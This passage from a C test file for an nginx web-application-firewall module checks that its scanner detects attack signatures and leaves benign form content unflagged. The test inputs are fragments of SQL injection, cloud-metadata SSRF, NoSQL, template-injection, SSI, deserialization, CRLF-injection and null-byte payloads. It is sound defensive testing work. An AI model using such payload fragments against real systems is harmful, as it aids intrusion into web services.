    check(1, "10k context-injected base64 bodies all hit");
}


static void
case_body_encoding_content(void)
{
    static const char *content[] = {
        "description=First+paragraph%0D%0ASecond+paragraph",
        "description=First%0a%0dSecond",
        "profile=https%3A%2F%2Fexample.test%2Fa%252Fb",
        "description=The+literal+text+%2500+is+an+example",
        "description=folder%255cfile",
        "{\"text\":\"%00, %u0000 and %252f are literal examples\"}",
        "A line break is written %0d%0a in a form.",
        "A header example:\r\nSet-Cookie: example=value",
        "A redirect example:\r\nLocation: /example",
        "A size example:\r\nContent-Length: 12",
        "%", "%0", "%GG", ""
    };
    static const struct {
        const char *input;
        ngx_http_shield_cat_e category;
    } controls[] = {
        {"/example%0D%0A", NGX_HTTP_SHIELD_CAT_CRLF},
        {"\r\nLocation: /example", NGX_HTTP_SHIELD_CAT_CRLF},
        {"/photo.php%00.jpg", NGX_HTTP_SHIELD_CAT_NULLBYTE},
        {"/folder%252fitem", NGX_HTTP_SHIELD_CAT_NULLBYTE}
    };
    uint64_t body_skip = ngx_http_shield_no_body_mask();
    ngx_http_shield_hit_t hit;
    size_t i;

    for (i = 0; i < sizeof(content) / sizeof(content[0]); i++) {
        check(scan_str_mode(content[i], body_skip, 0, &hit) == NGX_DECLINED,
              "form content with line breaks/encoding examples stays clean");
        check(scan_str_mode(content[i], body_skip, strlen(content[i]), &hit)
                  == NGX_DECLINED,
              "opaque text/JSON encoding examples stay body-clean");
    }
    for (i = 0; i < sizeof(controls) / sizeof(controls[0]); i++) {
        check(scan_str_mode(controls[i].input, 0, strlen(controls[i].input),
                            &hit) == NGX_OK,
              "URI/header CRLF and encoded-NUL controls remain detected");
        check(hit.cat == controls[i].category,
              "URI/header controls retain their original category");
    }
    check(scan_str_mode("content=First%0D%0ASecond&id=1+union+select+password",
                        body_skip, 0, &hit) == NGX_OK,
          "excluding body encoding heuristics retains SQLi detection");
    check(hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "the remaining body attack is attributed to SQLi");
}


static ngx_int_t
scan_body_policy(const char *data, size_t len, uint64_t skip,
    ngx_uint_t strict, ngx_http_shield_hit_t *hit)
{
    u_char lc[512], dec[512];

    if (len > sizeof(lc)) {
        abort();
    }
    return ngx_http_shield_scan_policy(&test_automata, (u_char *) data, len,
                lc, dec, "body", len,
                skip | ngx_http_shield_no_body_mask(), strict, hit);
}


static void
case_body_policy(void)
{
    static const char *markers[] = {
        "union select",
        "%c0%af",
        "!ruby/object:",
        "<!--#include virtual",
        "169.254.169.254",
        "/latest/meta-data/",
        "{\"$where\":",
        "{{7*7}}"
    };
    ngx_http_shield_hit_t hit;
    size_t i, j, k, n, siblings = 0;
    ngx_uint_t ambiguous;

    for (i = 0; i < sizeof(markers) / sizeof(markers[0]); i++) {
        n = strlen(markers[i]);
        check(scan_body_policy(markers[i], n, 0, 0, &hit) == NGX_DONE,
              "body-policy exact marker is observation, never clean/hit");
        check(scan_body_policy(markers[i], n, 0, 1, &hit) == NGX_OK,
              "body-policy strict restores exact marker enforcement");
        check(scan_body_policy(markers[i], n - 1, 0, 0, &hit)
                  == NGX_DECLINED,
              "body-policy incomplete marker is not observed");
        check(scan_body_policy(markers[i], n, (uint64_t) 1 << hit.cat,
                               0, &hit) == NGX_DECLINED,
              "body-policy category skip suppresses observation");
    }
    check(scan_body_policy("%c0%af union/**/select", 22, 0, 0, &hit)
              == NGX_OK && hit.cat == NGX_HTTP_SHIELD_CAT_SQLI,
          "body-policy decoded enforcement outranks raw observation");
    check(scan_body_policy("%c0%af %e0%80%af", 16, 0, 0, &hit) == NGX_OK,
          "body-policy raw sibling remains enforced");
    check(scan_body_policy("union select union/**/select", 28, 0, 0, &hit)
              == NGX_OK,
          "body-policy same-category later sibling remains enforced");
    check(scan_body_policy("union select\0union/**/select", 28, 0, 0, &hit)
              == NGX_OK,
          "body-policy embedded NUL does not stop sibling scan");
    check(scan_body_policy("union select%GG", 15, 0, 0, &hit) == NGX_DONE,
          "body-policy malformed trailing escape keeps observation");
    check(scan_body_policy("union select", 11, 0, 0, &hit) == NGX_DECLINED,
          "body-policy byte cap excludes incomplete marker");
    check(scan_body_policy("union select", 12, 0, 0, &hit) == NGX_DONE,
          "body-policy exact byte cap includes marker");
    check(scan_body_policy("", 0, 0, 0, &hit) == NGX_DECLINED,
          "body-policy empty input is not observation");
    for (i = 0; i < NGX_HTTP_SHIELD_NCATEGORIES; i++) {
        const ngx_http_shield_catdef_t *cat = &ngx_http_shield_categories[i];

        if (cat->cat != NGX_HTTP_SHIELD_CAT_SQLI
            && cat->cat != NGX_HTTP_SHIELD_CAT_OVERLONG
            && cat->cat != NGX_HTTP_SHIELD_CAT_NOSQL
            && cat->cat != NGX_HTTP_SHIELD_CAT_SSTI
            && cat->cat != NGX_HTTP_SHIELD_CAT_SSRF_META
            && cat->cat != NGX_HTTP_SHIELD_CAT_SSI
            && cat->cat != NGX_HTTP_SHIELD_CAT_RAILS_YAML)
        {
            continue;
        }
        for (j = 0; j < cat->nsigs; j++) {
            ambiguous = 0;
            for (k = 0; k < sizeof(markers) / sizeof(markers[0]); k++) {
                if (cat->sigs[j].len == strlen(markers[k])
                    && memcmp(cat->sigs[j].s, markers[k],
                              cat->sigs[j].len) == 0)
                {
                    ambiguous = 1;
                    break;
                }
            }
            if (ambiguous) {
                continue;
            }
            siblings++;
            check(scan_body_policy(cat->sigs[j].s, cat->sigs[j].len,
                                   0, 0, &hit) == NGX_OK,
                  "body-policy other predicate in affected category enforces");
        }
    }
    check(siblings == 157, "body-policy retains all 157 sibling predicates");
}


static void
case_diagnostic_identity(void)
{
    ngx_http_shield_hit_t hit;
    uint64_t rule, ruleset;
    const ngx_http_shield_sig_t sig[] = { NGX_HTTP_SHIELD_SIG("union select") };

    rule = ngx_http_shield_rule_identity("sig", "sqli", sig, 1,
                                       NGX_HTTP_SHIELD_MATCH_DECODED);
    check(rule == UINT64_C(0xc5d8b739bdf9c83d),
          "diagnostics stable public SQL identity vector");
    check(scan_str("union%20select", &hit) == NGX_OK
              && hit.cat == NGX_HTTP_SHIELD_CAT_SQLI && hit.rule == rule
              && strcmp(hit.view, "decoded") == 0,
          "diagnostics decoded attribution preserves old category");
    check(scan_body_policy("union select", 12, 0, 0, &hit) == NGX_DONE
              && hit.rule == rule && strcmp(hit.view, "decoded") == 0,
          "diagnostics observation retains exact rule identity");
    check(scan_body_policy("union select", 12, 0, 1, &hit) == NGX_OK
              && hit.rule == rule,
          "diagnostics strict decision preserves identity");
    check(scan_body_policy("%c0%af union/**/select",
                           sizeof("%c0%af union/**/select") - 1, 0, 0, &hit) == NGX_OK
              && hit.cat == NGX_HTTP_SHIELD_CAT_SQLI && hit.rule != rule
              && hit.rule != 0 && strcmp(hit.view, "decoded") == 0,
          "diagnostics enforcement identity excludes observed overlap");
    check(scan_str("%c0%af", &hit) == NGX_OK
              && strcmp(hit.view, "raw") == 0 && hit.rule != 0,
          "diagnostics raw view identity");
    check(scan_str("<java.lang.processbuilder", &hit) == NGX_OK
              && hit.cat == NGX_HTTP_SHIELD_CAT_DESERIAL && hit.rule != 0,
          "diagnostics same-endpoint category overlap identity");
    check(scan_str("jdbc:h2: x init=", &hit) == NGX_OK
              && hit.cat == NGX_HTTP_SHIELD_CAT_DESERIAL && hit.rule != 0,
          "diagnostics AND-rule identity");
    check(scan_body_policy("union select", 11, 0, 0, &hit) == NGX_DECLINED,
          "diagnostics truncated predicate creates no event");
    check(scan_body_policy("union select", 12,
                (uint64_t) 1 << NGX_HTTP_SHIELD_CAT_SQLI, 0, &hit)
                == NGX_DECLINED,
          "diagnostics skipped predicate creates no event");
    ruleset = ngx_http_shield_ruleset_identity();
    check(ruleset != 0 && ruleset == ngx_http_shield_ruleset_identity(),
          "diagnostics ruleset identity is deterministic");
}


/* Synthetic helper inputs prove predicate boundaries, not production request
 * reachability: the current NOSQL/SSI tables have no same-length mismatch. */
static void
case_synthetic_body_observe(void)
{
    const ngx_http_shield_sig_t nosql = NGX_HTTP_SHIELD_SIG("{\"$where\":");
    const ngx_http_shield_sig_t nosql_mismatch =
        NGX_HTTP_SHIELD_SIG("x\"$where\":");
    const ngx_http_shield_sig_t nosql_short = { nosql.s, nosql.len - 1 };
    const ngx_http_shield_sig_t ssi =
        NGX_HTTP_SHIELD_SIG("<!--#include virtual");
    const ngx_http_shield_sig_t ssi_mismatch =
        NGX_HTTP_SHIELD_SIG("x!--#include virtual");
    const ngx_http_shield_sig_t ssi_short = { ssi.s, ssi.len - 1 };

    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_NOSQL, &nosql) == 1,
          "synthetic helper NOSQL exact marker observes");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_NOSQL,
                                      &nosql_mismatch) == 0,
          "synthetic helper NOSQL same-length mismatch rejects");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_NOSQL,
                                      &nosql_short) == 0,
          "synthetic helper NOSQL one-byte-short marker rejects");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_XSS, &nosql) == 0,
          "synthetic helper NOSQL marker in unrelated category rejects");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_SSI, &ssi) == 1,
          "synthetic helper SSI exact marker observes");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_SSI,
                                      &ssi_mismatch) == 0,
          "synthetic helper SSI same-length mismatch rejects");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_SSI, &ssi_short) == 0,
          "synthetic helper SSI one-byte-short marker rejects");
    check(ngx_http_shield_body_observe(NGX_HTTP_SHIELD_CAT_XSS, &ssi) == 0,
          "synthetic helper SSI marker in unrelated category rejects");
}


static void
allocation_cleanup(void *data)
{
    ngx_uint_t *cleaned = data;

    *cleaned = 1;
}


static void
case_table_allocation_failure(void)
{
    static const char *const errors[] = {
        "allocation next NULL returns NGX_ERROR",
        "allocation out NULL returns NGX_ERROR",
        "allocation rout NULL returns NGX_ERROR",
        "allocation observe NULL returns NGX_ERROR"
    };
    static const char *const cleanups[] = {
        "allocation next NULL permits caller pool cleanup",
        "allocation out NULL permits caller pool cleanup",
        "allocation rout NULL permits caller pool cleanup",
        "allocation observe NULL permits caller pool cleanup"
    };
    ngx_uint_t             i, cleaned;
    ngx_pool_t            *pool;
    ngx_pool_cleanup_t    *cleanup;
    ngx_http_shield_ac_t   ac;
    ngx_int_t              rc;

    for (i = 0; i < 4; i++) {
        pool = ngx_create_pool(NGX_DEFAULT_POOL_SIZE, &test_log);
        if (pool == NULL) {
            abort();
        }
        cleaned = 0;
        cleanup = ngx_pool_cleanup_add(pool, 0);
        if (cleanup == NULL) {
            abort();
        }
        cleanup->handler = allocation_cleanup;
        cleanup->data = &cleaned;
        ngx_memzero(&ac, sizeof(ac));
        allocation_pool = pool;
        allocation_call = 0;
        allocation_fail_at = i + 1;
        rc = ngx_http_shield_ac_build(pool, &test_log, &ac,
                                     NGX_HTTP_SHIELD_MATCH_DECODED);
        allocation_pool = NULL;
        check(rc == NGX_ERROR, errors[i]);
        check(allocation_call == 4,
              "allocation injection reaches exactly four table allocations");
        ngx_destroy_pool(pool);
        check(cleaned == 1, cleanups[i]);
    }
}


int
main(void)
{
    case_synthetic_body_observe();
    case_table_allocation_failure();
    build_automata();

    case_body_policy();
    case_diagnostic_identity();
    case_clean_baseline();
    case_plus_context();
    case_body_base64_collisions();
    case_body_encoding_content();
    case_rule_term_count();
    case_state_capacity();
    case_definition_capacity();
    case_category_hits();
    case_react_flight_gadgets();
    case_percent_decoding();
    case_skip_mask();
    case_case_folding();
    case_malformed_and_embedded_nul();
    case_raw_vs_decoded_split();
    case_category_tiebreak();

    printf("\n%d check(s), %d failure(s)\n", checks, failures);

    /* A run that asserted NOTHING is a failure, not a pass: the whole point
     * of this binary is that it cannot go green by doing nothing. */
    if (checks == 0) {
        printf("FAIL: no checks ran\n");
        return 1;
    }

    return failures ? 1 : 0;
}
